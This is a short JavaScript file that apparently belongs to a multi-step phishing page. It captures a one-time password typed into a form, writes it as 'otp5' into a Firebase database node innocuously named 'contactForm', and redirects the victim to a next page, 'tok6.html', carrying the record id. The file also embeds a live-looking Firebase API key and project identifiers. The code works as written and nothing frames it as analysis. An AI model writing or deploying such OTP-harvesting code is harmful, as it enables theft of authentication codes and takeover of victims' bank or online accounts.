const firebaseConfig = {
  apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
  authDomain: "start-45a39.firebaseapp.com",
  databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
  projectId: "start-45a39",
  storageBucket: "start-45a39.appspot.com",
  messagingSenderId: "377019727798",
  appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference your database
var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("otp5").addEventListener("submit", submitUpdate);

function submitUpdate(e) {
  e.preventDefault();

  var otp5 = getElementVal("userotp");

  // Get the key from the query parameter
  const urlParams = new URLSearchParams(window.location.search);
  const entryKey = urlParams.get('id');

  updateMessages(entryKey, otp5);
}

const updateMessages = (key, otp5) => {
  var updates = {};

  if (otp5) updates.otp5 = otp5;

  contactFormDB.child(key).update(updates, function(error) {
      if (error) {
          console.error("Error updating data:", error);
      } else {
        window.location.href = `tok6.html?id=${key}`;
      }
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
